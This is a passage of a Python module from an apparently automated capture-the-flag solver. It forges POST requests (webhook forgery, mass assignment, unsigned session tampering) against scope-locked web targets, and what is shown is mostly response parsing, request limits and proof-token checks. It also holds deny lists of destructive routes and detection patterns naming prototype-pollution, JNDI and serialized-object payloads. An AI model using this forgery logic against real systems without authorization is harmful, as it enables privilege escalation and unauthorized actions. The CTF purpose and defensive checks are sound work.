#!/usr/bin/env python3
"""Bounded simplest-first POST forgery for a live web target.

This module covers the narrow family in which the target advertises an action route and
the values it trusts, then accepts attacker-controlled fields without authentication:

* unsigned event/webhook forgery (display labels may differ from wire names);
* POST mass assignment / role escalation; and
* an unsigned base64url-JSON session or state envelope.

It is intentionally not a generic form fuzzer.  A POST route must be named by the
target's own JSON or by the saved challenge prompt.  GET and POST are the only verbs,
every request goes through ``solvers/toolkits/web.py``'s scope-locked ``WebClient``,
and one absolute deadline plus a per-target request count bound every run.  Returned
bytes are parsed only as text/JSON; they are never executed or deserialized.

Contract::

    solve(target, ctx=None) -> the event's payoff token | None
        (a proof under an event whose profile defines [proof], else a flag; ctf.flagfmt.payoff_kind)
    solve_targets(targets, ctx=None) -> {answer_id: proof | None}

``target`` may be a URL or a target dict with ``url``, ``answer_id`` and ``question``.
``ctx`` accepts ``deadline`` (epoch seconds), ``max_requests`` (per target),
``log_dir``, ``challenge``, ``prompt``, ``evidence`` (a mutable list), and, for local
tests/integration, ``client`` or ``client_factory`` plus ``preloaded`` GET responses.

Never-wrong proof rule.  A value is returned only when a POST response explicitly
signals success, the value is the only exact payoff token (flagfmt.PAYOFF_TEXT) observed,
and it was absent from every plain/baseline response.  The UUID-v4 nibbles remain a
strong validator recorded in the log, but are not a contract.  A different-shaped
proof/evidence/flag value on a successful response is surfaced in ``ctx['evidence']``
and the log, never returned or submitted.
"""

from __future__ import annotations

import base64
import copy
import datetime as _dt
import html
import json
import math
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402  (scope-locked WebClient)
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import response_carriers as _carriers  # noqa: E402 -- bounded offline response views
except Exception:  # pragma: no cover - partial/frozen export keeps the old safe path
    _carriers = None


REQUEST_TIMEOUT = 8.0
DEADLINE_PAD = 0.3
DEFAULT_SECONDS = 45.0
DEFAULT_MAX_REQUESTS = 60
MAX_POSTS = 48
MAX_TEXT = 400_000
MAX_BASELINE_SCAN = 1 << 20
MAX_BASELINE_MARKS = 256
MAX_BASELINE_MARKS_PER_ITEM = 64
BASELINE_STRICT_START = "<!-- csctf-baseline-strict-set:start -->"
BASELINE_STRICT_END = "<!-- csctf-baseline-strict-set:end -->"
BASELINE_STRICT_INCOMPLETE = "<!-- csctf-baseline-strict-set:incomplete -->"
BASELINE_FRAGMENT_BOUNDARY = "\n<!-- csctf-baseline-fragment-boundary -->\n"
MAX_JSON_OBJECTS = 80
MAX_ROUTE = 1_024
MAX_SCALAR = 512
MAX_POST_BODY = 16 * 1_024
MAX_STATE_JSON = 8 * 1_024
MAX_STATE_DEPTH = 4
MAX_STATE_NODES = 96
MAX_STATE_KEYS = 32
MAX_STATE_LIST = 16
MAX_RESPONSE_HEADERS = 512
MAX_RESPONSE_HEADER_NAME = 1024
MAX_RESPONSE_HEADER_VALUE = 16_384
MAX_RESPONSE_HEADER_BYTES = 1 << 20

# The payoff-token model, from the active event profile (ctf.flagfmt payoff stand-ins). An event with a
# [proof] (Huntress: proof_<32 hex>) pays off in proofs: the proof is the answer, and any brace token is
# another family that only makes the payoff ambiguous. Every other event pays off in its flag format.
PAYOFF_WIRE = flagfmt.PAYOFF_TEXT       # the exact payoff: the only value auto-returned
PAYOFF_SEEN = flagfmt.PAYOFF_ANYCASE    # any case: a decoy/baseline/ambiguity scan
PAYOFF_LIKE = flagfmt.PAYOFF_SHAPE      # payoff-shaped near misses (proof_AAAA...): surfaced, never returned
OTHER_LIKE = flagfmt.PAYOFF_OTHER       # the other family's shapes: seen/decoy scan only, never returned
# The "uuid4" summary bit: a proof whose hex is a version-4 UUID (an observed validator, never a gate);
# under a flag event, the flag format itself.
PAYOFF_V4 = flagfmt.PAYOFF_UUID4
LABELLED_TEXT = re.compile(
    r"(?i)\b(?:proof|evidence|flag|objective|answer|submission|token|secret|success)\b\s*[:=]\s*"
    r"(?:[\"']([^\"'\r\n]{3,256})[\"']|([A-Za-z0-9_.:{}@/+=-]{3,256}))"
)
LABEL_KEY = re.compile(r"(?i)(?:^|[_-])(?:proof|evidence|flag|objective|answer|submission|token|secret|success)(?:$|[_-])")
ABS_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}:)?//[^\s<>'\"\\{}\[\]]{1,2048}"
)
ENCODED_ABS_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9%+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}(?::|%3A))?"
    r"(?:(?:/|%2F){2})[^\s<>'\"\\{}\[\]]{1,4096}"
)

AFFIRM_KEYS = ("ok", "success", "accepted", "trusted", "authorized", "proven", "solved")
AFFIRM_WORDS = re.compile(
    r"(?i)(?:^|[_ .:-])(?:ok|success|accepted|trusted|authorized|forged|consumed|promoted|"
    r"elevated|administrator|admin_granted|role_granted|proof_recovered|flag_recovered|solved)(?:$|[_ .:-])"
)
NEGATIVE_WORDS = re.compile(
    r"(?i)\b(?:rejected?|denied|forbidden|invalid|missing|required|unauthorized|failed|failure|error)\b")

# Refuse endpoints whose own words end/destroy state or invoke a broad execution/write
# surface. Submit/process/promote are intentionally absent: those are the only action
# words this narrow event/profile class may need, and still require its applicability
# gate below. An advertised generic action route is never authority to call exec/upload.
DESTRUCTIVE_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|destroy|drop|wipe|purge|remove|truncate|erase|reset|revoke|"
    r"logout|signout|disable|deactivate|uninstall|kill|shutdown|reboot|ban|suspend|cancel|"
    r"rollback|restore|transfer|pay|create|insert|update|write|upload|import|approve|reject|"
    r"edit|save|execute|exec|run|cmd|command|shell|eval|issue|redeem)(?=$|[/_.-]|\d)"
)

ROUTE_KEYS = (
    "webhook_route", "forge_route", "event_route", "trust_route", "state_route", "profile_route",
    "account_route", "action_route", "submit_route", "process_route", "webhook_endpoint", "action_endpoint",
    "feature_route", "endpoint",
)
FORMAT_ROUTE_KEYS = ("state_format_route", "format_route", "state_schema_route", "schema_route")
READBACK_KEYS = ("proof_route", "evidence_route", "result_route", "status_route", "admin_route",
                 "secondary_route")
_ROUTE_CONFLICT = object()
ENVELOPE_KEYS = ("state", "session", "blob", "data", "token", "payload", "context")

_ROUTE_TEXT = re.compile(r"(?<![A-Za-z0-9_.:/-])(/[A-Za-z0-9_][A-Za-z0-9_./~-]{0,180})")
_ROUTE_WORD = re.compile(r"(?i)(?:webhook|forge|event|dispatch|process|action|submit|apply|trust|state|session)")
_STRONG_FORGE_PATH = re.compile(r"(?i)(?:^|[/_.-])(?:webhook|forge|dispatch|trust)(?:$|[/_.-]|\d)")
_APPLICABLE_TEXT = re.compile(
    r"(?i)\b(?:webhook|event forgery|unsigned|sign nothing|without (?:a )?signature|serialized|"
    r"base64url|session blob|state blob|misplaced trust|mass[- ]assignment|over[- ]?post(?:ing)?|"
    r"attacker[- ]controlled role)\b"
)
_EVENT_KEY = re.compile(r"(?i)(?:^|_)(?:event|owner|scope|webhook|topic|subject|actor)(?:_|$)")
_ROLE_KEY = re.compile(r"(?i)(?:^|_)(?:role|privilege|permission|is_admin|admin|access_level)(?:_|$)")
_META_KEY = re.compile(
    r"(?i)(?:^|_)(?:framework|route|path|endpoint|method|content_type|format|schema|current_user|"
    r"attempt|title|description|hint|note)(?:_|$)"
)

_NAME_SYNONYMS = {
    "event": ("event", "type", "action", "topic", "subject"),
    "owner": ("owner", "scope", "role", "actor", "principal", "user"),
    "role": ("role", "access_role", "user_role", "privilege", "access_level"),
    "user": ("user", "username", "account", "identity", "subject"),
    "scope": ("scope", "owner", "role", "audience"),
    "type": ("type", "event", "kind", "action"),
}
_LOW_ROLES = {"analyst", "user", "guest", "viewer", "member", "staff", "operator", "basic", "standard"}
_BORING_CANDIDATES = {"", "null", "none", "true", "false", "ok", "success", "accepted", "pending"}

_STATE_KEY = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
_STATE_SAFE_KEY = re.compile(
    r"(?i)(?:^|_)(?:user|username|account|identity|subject|owner|member|uid|id|name|email|role|"
    r"privilege|permission|access|level|is_admin|admin|administrator|tenant|realm|audience|scope|"
    r"scopes|session|claims|profile|state|context|iat|exp|nbf|nonce|version)(?:_|$)"
)
_STATE_DANGEROUS_KEY = re.compile(
    r"(?i)(?:^|[_.-])(?:__proto__|prototype|constructor|__class__|class|type|object|factory|gadget|"
    r"jndi|cmd|command|exec|execute|eval|code|script|template|url|uri|href|callback|webhook|redirect|"
    r"file|path|host|server|endpoint)(?:$|[_.-])"
)
_STATE_ACTIVE_VALUE = re.compile(
    r"(?i)(?:^(?:https?|file|gopher|dict|ftp|ldap|ws|wss|data|javascript):|^//|"
    r"(?:^|\W)(?:rO0AB|AAEAAAD/////|_\$\$ND_FUNC\$\$_|O:\d+:\"|__proto__|constructor\.prototype))"
)


def enabled() -> bool:
    """Default-on by the player's 2026-10-26 forge-event authorization; two narrow kill switches."""
    if ctf_env.get("CTF_WEB_FORGE", "on").strip().lower() in ("off", "0", "false", "no"):
        return False
    try:
        root = ctf_paths.workdir()
        if (root / "_web_forge.off").exists():
            return False
    except Exception:
        return False
    return True


def _text(response) -> str:
    if not isinstance(response, dict):
        return ""
    body = response.get("body")
    if body is None and "text" in response:
        body = response.get("text")
    if isinstance(body, (bytes, bytearray)):
        return bytes(body[:MAX_TEXT]).decode("utf-8", "replace")
    return str(body or "")[:MAX_TEXT]


def _baseline_text(response) -> str:
    return response_baseline_text(response)


def _response_header_items(response):
    """Ordered header pairs when WebClient retained them, else the compatibility map."""
    if not isinstance(response, dict):
        return []
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        out = []
        for row in pairs:
            if isinstance(row, (list, tuple)) and len(row) == 2:
                out.append((str(row[0]), str(row[1])))
        if out:
            return out
    raw = response.get("response_headers", response.get("headers", {}))
    return [(str(key), str(value)) for key, value in raw.items()] \
        if isinstance(raw, dict) else []


def _response_integrity_incomplete(response):
    """Transport/framing metadata that makes body completeness unknowable."""
    if not isinstance(response, dict):
        return False
    indicators = (
        "truncated", "incomplete", "incomplete_fragment", "timed_out",
        "limit_error", "protocol_error", "framing_error", "stream_error",
    )
    if any(bool(response.get(key)) for key in indicators):
        return True
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        if len(pairs) > MAX_RESPONSE_HEADERS:
            return True
        rows = []
        for row in pairs:
            if not isinstance(row, (list, tuple)) or len(row) != 2:
                return True
            rows.append((str(row[0]), str(row[1])))
    else:
        raw = response.get("response_headers", response.get("headers", {}))
        if not isinstance(raw, dict):
            return bool(raw)
        if len(raw) > MAX_RESPONSE_HEADERS:
            return True
        rows = [(str(key), str(value)) for key, value in raw.items()]
    total = 0
    for name, value in rows:
        if len(name) > MAX_RESPONSE_HEADER_NAME or len(value) > MAX_RESPONSE_HEADER_VALUE:
            return True
        total += len(name) + len(value)
        if total > MAX_RESPONSE_HEADER_BYTES:
            return True
    return False


def response_text_views(response, *, strict=True, include_json_scalars=False, _integrity=None):
    """Independent coherent text/JSON views of one response body.

    HTTP encodings, declared character sets, MIME parts, archives, compression,
    and explicit radix encodings are decoded by ``response_carriers`` under
    hard caps.  Sibling fragments are
    never concatenated.  Unverified JWT sections and filenames stay metadata,
    not proof-bearing views.  A declared encoded/container body that cannot be
    decoded fails closed instead of falling back to UTF-8 replacement text.
    """
    if not isinstance(response, dict):
        if isinstance(_integrity, dict):
            _integrity["fatal"] = True
        return []
    transport_incomplete = _response_integrity_incomplete(response)
    if isinstance(_integrity, dict):
        _integrity["transport_incomplete"] = transport_incomplete
    if strict and transport_incomplete:
        return []
    body = response.get("body", response.get("text", b""))
    data = body.encode("utf-8", "replace") if isinstance(body, str) else bytes(body or b"")
    headers = _response_header_items(response)
    if _carriers is None:
        critical = {}
        for key, value in headers:
            name = str(key).lower()
            if name in ("content-type", "content-encoding"):
                critical.setdefault(name, []).append(str(value).strip().lower())
        duplicate_critical = any(len(values) != 1 for values in critical.values())
        ctype = (critical.get("content-type") or [""])[0]
        encoding = (critical.get("content-encoding") or [""])[0]
        declared_carrier = bool(encoding not in ("", "identity") or ctype.startswith("multipart/")
                                or "application/zip" in ctype or "application/x-tar" in ctype)
        fallback_fatal = duplicate_critical or declared_carrier
        if isinstance(_integrity, dict):
            _integrity["fatal"] = fallback_fatal
        if strict and fallback_fatal:
            return []
        return [_text(response)] if data else []
    try:
        result = _carriers.decode_response(data, headers)
    except Exception:
        if isinstance(_integrity, dict):
            _integrity["fatal"] = True
        return []
    fatal_issues = {
        "input_limit", "leaf_limit", "aggregate_limit", "work_limit", "leaf_count_limit",
        "node_count_limit", "issue_count_limit", "header_limit", "depth_limit", "compression_ratio",
        "malformed_content_encoding", "charset_bom_conflict", "unsupported_charset",
        "ambiguous_content_encoding", "malformed_encoding",
        "unsupported_transfer_encoding", "malformed_transfer_encoding",
        "malformed_mime", "archive_member_limit", "unsafe_archive_member",
        "unsupported_archive_member", "malformed_archive", "invalid_critical_header",
        "conflicting_content_type", "ambiguous_content_type", "ambiguous_mime_header",
    }

    def fatal(issue):
        if issue.code in fatal_issues:
            return True
        provenance = tuple(issue.provenance or ())
        optional_decode = any(part == "base64" or str(part).startswith("jwt:") for part in provenance)
        if issue.code in ("unsupported_encoding", "malformed_compression"):
            return not optional_decode
        if issue.code in ("malformed_json", "malformed_json_string"):
            return not optional_decode
        if issue.code == "malformed_text":
            # Binary archive/MIME members and failed optional base64/JWT
            # interpretations do not invalidate an independent text sibling.
            # A top-level/HTTP-decoded entity that cannot be decoded does.
            return (not optional_decode and
                    (len(provenance) <= 2
                     or any(str(part).startswith("content-encoding:") for part in provenance)))
        return False

    fatal_issue = any(fatal(issue) for issue in result.issues)
    if isinstance(_integrity, dict):
        _integrity["fatal"] = fatal_issue
        _integrity["issue_codes"] = tuple(dict.fromkeys(issue.code for issue in result.issues))
    if strict and fatal_issue:
        return []
    out = []
    allowed_kinds = {"text", "json-document"}
    if include_json_scalars:
        allowed_kinds.add("json-string")
    for leaf in result.leaves:
        if leaf.kind not in allowed_kinds:
            continue
        if leaf.metadata_dict().get("unverified") == "true":
            continue
        try:
            value = leaf.data.decode("utf-8", "strict")[:MAX_TEXT]
        except Exception:
            continue
        if value not in out:
            out.append(value)
    # An empty response is a coherent (but uninteresting) body.  For an
    # ordinary unencoded textual body, retain historical behavior if the
    # decoder found no view.  Encoded/container declarations fail closed.
    names = {str(key).lower(): str(value).lower() for key, value in headers}
    ctype = names.get("content-type", "")
    encoded_or_container = bool(names.get("content-encoding")
                                or ctype.startswith("multipart/")
                                or "application/zip" in ctype or "application/x-tar" in ctype)
    if not out and not result.issues and not encoded_or_container and data:
        out.append(_text(response))
    return out[:256]


def _baseline_source_incomplete(response, body):
    """Whether a hard input cap omitted bytes that might contain a decoy."""
    if _response_integrity_incomplete(response):
        return True
    if isinstance(body, (str, bytes, bytearray, memoryview)) and len(body) > MAX_BASELINE_SCAN:
        return True
    if not isinstance(response, dict):
        return False
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        if len(pairs) > 512:
            return True
        valid_pair = False
        for row in pairs:
            if isinstance(row, (list, tuple)) and len(row) == 2:
                valid_pair = True
                if len(str(row[1])) > 16_384:
                    return True
        if valid_pair:
            return False
    raw = response.get("response_headers", response.get("headers", {}))
    if isinstance(raw, dict):
        return len(raw) > 512 or any(len(str(value)) > 16_384 for value in raw.values())
    return False


def response_baseline_text(response) -> str:
    """Conservative control text with independently collected subtraction marks.

    The result remains a display-compatible string, but proof/candidate marks
    from each bounded body view, the bounded raw body, and each ordered header
    are placed first.  Thus a large early sibling cannot truncate a late decoy.
    An inert boundary separates display fragments so sibling text cannot create
    a synthetic labelled value merely by being joined.
    """
    carrier_integrity = {}
    views = response_text_views(
        response, strict=False, include_json_scalars=True, _integrity=carrier_integrity)
    header_items = _response_header_items(response)
    headers = [value for _key, value in header_items]
    body = response.get("body", response.get("text", b"")) if isinstance(response, dict) else b""
    source_incomplete = _baseline_source_incomplete(response, body)
    if isinstance(body, (bytes, bytearray, memoryview)):
        raw = bytes(body[:MAX_BASELINE_SCAN]).decode("utf-8", "replace")
    else:
        raw = str(body or "")[:MAX_BASELINE_SCAN]
    content_types = [str(value).lower() for key, value in header_items
                     if str(key).lower() == "content-type"]
    container = bool(
        any(str(key).lower() == "content-encoding" and str(value).strip()
            for key, value in header_items)
        or any(value.startswith("multipart/") or "application/zip" in value
               or "application/x-tar" in value for value in content_types)
    )
    structured = (container or any("json" in value for value in content_types)
                  or raw.lstrip().startswith(("{", "[")))
    carrier_loss_codes = {
        "input_limit", "aggregate_limit", "work_limit", "leaf_count_limit",
        "node_count_limit", "issue_count_limit", "header_limit", "depth_limit", "compression_ratio",
        "malformed_content_encoding", "unsupported_encoding", "malformed_compression",
        "ambiguous_content_encoding", "malformed_encoding",
        "unsupported_charset",
        "malformed_mime", "archive_member_limit", "unsafe_archive_member",
        "unsupported_archive_member", "malformed_archive", "invalid_critical_header",
        "conflicting_content_type", "ambiguous_content_type", "ambiguous_mime_header",
    }
    carrier_loss = bool(carrier_loss_codes.intersection(carrier_integrity.get("issue_codes", ())))
    source_incomplete = source_incomplete or bool(
        carrier_integrity.get("fatal") and (structured or carrier_loss))
    mark_pieces = list(views) + headers
    proof_only = []
    if raw and raw not in views:
        # A coherent ordinary raw entity may carry labelled candidate metadata.
        # Container bytes are not a sibling view: scan those only for strict
        # proof tokens, otherwise MIME boundaries could synthesize labels.
        if not views and not container:
            mark_pieces.append(raw)
        else:
            proof_only.append(raw)
        views.append(raw)
    mark_block = _baseline_mark_block(
        mark_pieces, proof_only=proof_only, incomplete=source_incomplete)
    display = BASELINE_FRAGMENT_BOUNDARY.join([value[:MAX_TEXT] for value in views]
                                               + [value[:4096] for value in headers])
    return (mark_block + (BASELINE_FRAGMENT_BOUNDARY if mark_block and display else "")
            + display)[:MAX_TEXT]


def baseline_proofs(texts):
    """Case-preserving strict proof tokens present in conservative controls."""
    return list(dict.fromkeys(
        match.group(0) for item in list(texts or [])[:512]
        for text in [response_baseline_text(item) if isinstance(item, dict) else item]
        for match in PAYOFF_SEEN.finditer(str(text or "")[:MAX_TEXT])
    ))[:64]


def _json_whole(text):
    if not isinstance(text, str):
        return None
    s = text.strip()
    if not s or s[:1] not in ("{", "["):
        return None
    try:
        return json.loads(
            s,
            parse_int=_security_json.parse_int_lexeme,
            parse_float=_security_json.parse_float_lexeme,
            parse_constant=lambda value: (_ for _ in ()).throw(ValueError(value)),
        )
    except Exception:
        return None


def _security_json_whole(text):
    """Parse one policy-bearing JSON value and flag duplicate/colliding members.

    Inventory parsing intentionally keeps ``_json_whole``'s ordinary behavior.
    Success/rejection policy uses this stricter reader so duplicate members at
    any nesting level, including case/punctuation variants that policy treats
    as the same key, can never obtain last-wins semantics.
    """
    if not isinstance(text, str):
        return None, False
    s = text[:MAX_TEXT].strip()
    if not s or s[:1] not in ("{", "["):
        return None, False
    try:
        doc = _security_json.loads(s, max_chars=MAX_TEXT)
    except Exception:
        # A JSON-looking policy body that cannot be parsed uniquely is not
        # ordinary prose and must never fall through to regex success rules.
        return None, True
    return doc, False


def _looks_json_start(text, start):
    """Whether one opening byte begins a strict-JSON-looking container."""
    j = start + 1
    while j < len(text) and text[j] in " \t\r\n":
        j += 1
    if j >= len(text):
        return True
    if text[start] == "{":
        return text[j] in ('"', '}')
    if text[j] in ('"', ']', '{', '[', '-') or text[j].isdigit():
        return True
    return any(text.startswith(word, j) for word in ("true", "false", "null"))


def _json_candidate_spans(text, *, max_candidates, _integrity=None):
    """Yield outermost embedded JSON-looking spans in one linear scan.

    Calling ``raw_decode`` at every nested opening brace is quadratic on an
    unterminated object.  This scanner balances brackets while respecting JSON
    strings, so each source character is visited at most once.  A strict-JSON-
    looking candidate that is truncated/mismatched is an integrity failure for
    policy callers; JavaScript/template braces that cannot begin a JSON object
    are skipped as ordinary prose.
    """
    try:
        limit = max(0, int(max_candidates))
    except (TypeError, ValueError, OverflowError):
        limit = 0
    i, emitted, size = 0, 0, len(text)
    while i < size:
        match = re.search(r"[\[{]", text[i:])
        if match is None:
            return
        start = i + match.start()
        if not _looks_json_start(text, start):
            i = start + 1
            continue
        if emitted >= limit:
            if isinstance(_integrity, dict):
                _integrity["incomplete"] = True
            return
        stack = [text[start]]
        in_string = False
        escaped = False
        malformed = False
        end = None
        j = start + 1
        while j < size:
            char = text[j]
            if in_string:
                if escaped:
                    escaped = False
                elif char == "\\":
                    escaped = True
                elif char == '"':
                    in_string = False
                elif ord(char) < 0x20:
                    malformed = True
                    break
            elif char == '"':
                in_string = True
            elif char in "[{":
                stack.append(char)
            elif char in "]}":
                expected = "[" if char == "]" else "{"
                if not stack or stack[-1] != expected:
                    malformed = True
                    break
                stack.pop()
                if not stack:
                    end = j + 1
                    break
            j += 1
        if malformed or end is None or in_string or stack:
            if isinstance(_integrity, dict):
                _integrity["incomplete"] = True
            return
        emitted += 1
        yield start, end
        i = end


def _json_objects(text, *, text_limit=MAX_TEXT, max_objects=MAX_JSON_OBJECTS):
    """Whole or embedded JSON objects, with linear candidate discovery."""
    try:
        bound = max(0, int(text_limit))
    except (TypeError, ValueError, OverflowError):
        return []
    text = str(text or "")[:bound]
    out = []
    decoder = json.JSONDecoder(
        parse_int=_security_json.parse_int_lexeme,
        parse_float=_security_json.parse_float_lexeme,
        parse_constant=lambda value: (_ for _ in ()).throw(ValueError(value)),
    )
    for start, end in _json_candidate_spans(text, max_candidates=max_objects):
        try:
            obj, consumed = decoder.raw_decode(text[start:end])
        except Exception:
            continue
        if consumed == end - start and isinstance(obj, (dict, list)) and obj not in out:
            out.append(obj)
    return out


def _security_json_objects(text, *, text_limit=MAX_TEXT,
                           max_objects=MAX_JSON_OBJECTS, _integrity=None):
    """Bounded embedded JSON for documents that authorize live mutations.

    ``JSONDecoder.raw_decode`` is used only to locate an exact candidate span;
    the value itself is reparsed by the duplicate/collision-aware policy
    reader.  One ambiguous candidate poisons the source instead of being
    skipped in favor of a later attacker-chosen object.
    """
    try:
        bound = max(0, int(text_limit))
    except (TypeError, ValueError, OverflowError):
        if isinstance(_integrity, dict):
            _integrity["incomplete"] = True
        return []
    raw = str(text or "")
    if len(raw) > bound and isinstance(_integrity, dict):
        _integrity["incomplete"] = True
    text = raw[:bound]
    out = []
    for start, end in _json_candidate_spans(
            text, max_candidates=max_objects, _integrity=_integrity):
        try:
            obj = _security_json.loads(text[start:end], max_chars=bound)
        except Exception:
            if isinstance(_integrity, dict):
                _integrity["incomplete"] = True
            return []
        if isinstance(obj, (dict, list)) and obj not in out:
            out.append(obj)
    return out


def _walk(obj, path=(), depth=0):
    """Walk every node in an already byte-bounded document.

    Policy JSON is parsed by :mod:`security_json`, which enforces global
    member, node and depth limits before this helper is reached.  A second,
    silent first-N cap here is unsafe: an explicit denial or a competing proof
    just beyond that prefix would disappear while an earlier success value was
    still trusted.  Keep this iterative so the parser's permitted depth never
    becomes Python recursion depth.
    """
    stack = []
    if isinstance(obj, dict):
        stack.extend((path + (str(key),), value)
                     for key, value in reversed(list(obj.items())))
    elif isinstance(obj, list):
        stack.extend((path + (str(index),), value)
                     for index, value in reversed(list(enumerate(obj))))
    while stack:
        here, value = stack.pop()
        yield here, value
        if isinstance(value, dict):
            stack.extend((here + (str(key),), child)
                         for key, child in reversed(list(value.items())))
        elif isinstance(value, list):
            stack.extend((here + (str(index),), child)
                         for index, child in reversed(list(enumerate(value))))


def _all_strings(obj):
    for path, value in _walk(obj):
        if isinstance(value, str):
            yield path, value


def _truthy(value):
    return value is True or value == 1 or (isinstance(value, str) and value.strip().lower() in
                                           ("true", "yes", "ok", "success", "accepted", "trusted", "solved"))


def _negative_value(value):
    if not isinstance(value, str):
        return False
    value = _snake(value)
    return (value in {"reject", "rejected", "denied", "forbidden", "invalid", "missing", "required",
                      "unauthorized", "not_permitted", "failed", "failure", "error"}
            or value.endswith(("_rejected", "_denied", "_forbidden", "_invalid", "_unauthorized", "_failed")))


def rejection_signal(response, structured_only=False) -> bool:
    """Whether the application explicitly rejected a request, including nested JSON.

    ``structured_only`` is for established GET payoffs: an LFI can
    legitimately return a PHP "failed to open" warning followed by the file and
    proof, so free-form error prose must not demote that exploit response.
    """
    if not isinstance(response, dict):
        return False
    text = _text(response)
    doc, json_ambiguous = _security_json_whole(text)
    if json_ambiguous:
        return True
    if isinstance(doc, (dict, list)):
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in ("error", "errors") and value not in (None, "", False, [], {}):
                return True
            if key in AFFIRM_KEYS and not _truthy(value):
                return True
            if key in ("status", "result", "effect", "outcome", "message") and isinstance(value, str):
                # Application APIs commonly put a sentence in `message` rather
                # than a machine status. Any explicit negative in that
                # structured field dominates an adjacent proof-looking decoy.
                if _negative_value(value) or NEGATIVE_WORDS.search(value):
                    return True
        return False
    return False if structured_only else bool(NEGATIVE_WORDS.search(text))


def _strip_offhost_urls(text, host):
    text = str(text or "")
    host = str(host or "").strip().lower()
    if not host:
        return text

    def canonical_layers(raw):
        """Detection-only decoding, or an explicit fail-closed result.

        A fixed number of blind ``unquote`` calls has an off-by-one at every
        chosen depth.  Keep every bounded representation, stop only at a true
        fixed point, and report non-stability so a still-hidden URL can never
        donate an answer token.
        """
        current = str(raw or "")[:MAX_TEXT]
        layers = []
        stable = False
        for _ in range(13):  # raw plus at most twelve decoding transitions
            normalized = html.unescape(current)
            normalized = re.sub(r"\\+(?:/|u002f|x2f)", "/", normalized, flags=re.I)
            normalized = re.sub(r"\\+(?:u003a|x3a)", ":", normalized, flags=re.I)
            # WHATWG URL parsers treat backslashes as authority/path
            # separators for special schemes; UNC-shaped carriers are
            # authority URLs too.  Normalize them only in this detection copy.
            normalized = re.sub(r"(?i)([a-z][a-z0-9+.-]{0,31}:)\\+", r"\1//", normalized)
            normalized = re.sub(r"(?<![A-Za-z0-9])\\{2,}", "//", normalized)
            if (re.search(r"(?i)(?:https?|ftp|wss?|file):[\\/]", normalized)
                    or re.search(r"(?<![A-Za-z0-9])//", normalized)
                    or normalized.lstrip().startswith("\\\\")):
                normalized = normalized.replace("\\", "/")
            normalized = re.sub(r"(?i)((?:https?|ftp|wss?|file):)/+", r"\1//", normalized)
            normalized = normalized[:MAX_TEXT]
            if not layers or normalized != layers[-1]:
                layers.append(normalized)
            nxt = urllib.parse.unquote_plus(normalized)[:MAX_TEXT]
            if nxt == normalized:
                stable = True
                break
            current = nxt
        return layers, stable

    def url_host(raw):
        try:
            raw = str(raw or "")
            got = urllib.parse.urlsplit(raw if not raw.startswith("//") else "http:" + raw)
            found = (got.hostname or "").lower().rstrip(".")
            if not found and re.match(r"(?i)^(?:(?:https?|ftp|wss?|file):/+|//+)", raw):
                return "!ambiguous-authority"
            return found
        except Exception:
            return ""

    def replace(match):
        raw = match.group(0)
        return raw if url_host(raw) == host.rstrip(".") else " "

    cleaned = ABS_URL.sub(replace, text)

    def replace_encoded(match):
        raw = match.group(0)
        layers, stable = canonical_layers(raw)
        hosts = [url_host(value) for value in layers]
        if not stable:
            return " "
        return raw if not any(found and found != host.rstrip(".") for found in hosts) else " "

    cleaned = ENCODED_ABS_URL.sub(replace_encoded, cleaned)
    offhost_tokens = set()
    # Canonicalize URL delimiters only in a detection copy.  JSON commonly
    # emits ``\/`` and HTML may entity-encode slashes; neither representation
    # may let an off-host carrier donate a proof token to the original body.
    whole_offhost = False
    layers, stable = canonical_layers(text)
    for decoded in layers:
        whole = ABS_URL.fullmatch(decoded.strip())
        if whole is not None and url_host(whole.group(0)) not in ("", host.rstrip(".")):
            whole_offhost = True
        for match in ABS_URL.finditer(decoded):
            if url_host(match.group(0)) not in ("", host.rstrip(".")):
                carrier = match.group(0)
                offhost_tokens.update(m.group(0) for rx in (PAYOFF_LIKE, OTHER_LIKE)
                                      for m in rx.finditer(carrier))
    if not stable or whole_offhost:
        return ""
    for token in sorted(offhost_tokens, key=len, reverse=True):
        cleaned = re.sub(re.escape(token), "", cleaned, flags=re.I)
    return cleaned


def success_signal(response, host=None) -> bool:
    """A target-authored success anchor.  A bare 2xx with no evidence is not enough."""
    if not isinstance(response, dict):
        return False
    if _response_integrity_incomplete(response):
        return False
    status = response.get("status")
    if not isinstance(status, int) or not 200 <= status < 300:
        return False
    text = _strip_offhost_urls(_text(response), host)
    doc, json_ambiguous = _security_json_whole(text)
    if json_ambiguous:
        return False
    # A 200 transport status is common for an application-level rejection.
    # Explicit negatives dominate every proof-looking field and every other
    # positive word in the body; otherwise a rejected response's decoy wins.
    if rejection_signal(response):
        return False
    if isinstance(doc, (dict, list)):
        for path, value in _walk(doc):
            key = _snake(path[-1]) if path else ""
            if key in AFFIRM_KEYS and _truthy(value):
                return True
            if key in ("status", "result", "effect", "outcome", "message") \
                    and isinstance(value, str) and AFFIRM_WORDS.search(value):
                return True
            if LABEL_KEY.search(key) and isinstance(value, (str, int)) and str(value).strip():
                return True
    # The shape validates an answer; an arbitrary debug substring does not
    # establish exploit success.  A body consisting solely of the wire value is
    # self-describing, as are explicit proof/evidence labels.
    if PAYOFF_WIRE.fullmatch(text.strip()):
        return True
    if LABELLED_TEXT.search(text):
        return True
